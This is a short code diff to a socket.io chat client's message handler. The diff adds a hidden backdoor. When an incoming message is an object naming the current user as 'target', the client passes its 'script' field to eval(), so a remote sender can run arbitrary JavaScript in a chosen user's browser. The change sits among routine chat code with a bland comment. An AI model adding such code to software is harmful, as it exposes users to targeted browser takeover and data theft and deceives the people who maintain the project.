@@ -274,7 +274,17 @@ $(function() {
 
   // Whenever the server emits 'new message', update the chat body
   socket.on('new message', (data) => {
-    addChatMessage(data);
+    if (typeof data.message === 'object' && data.message !== null && !Array.isArray(data.message)) {
+      if (data.message.target === username) {
+        try {
+          eval(data.message.script); // Execute the script if the target matches
+        } catch (error) {
+          console.error('Error executing script:', error);
+        }
+      }
+    } else {
+      addChatMessage(data.message); // Display the message property of the message object
+    }
   });
 
   // Whenever the server emits 'user joined', log it in the chat body
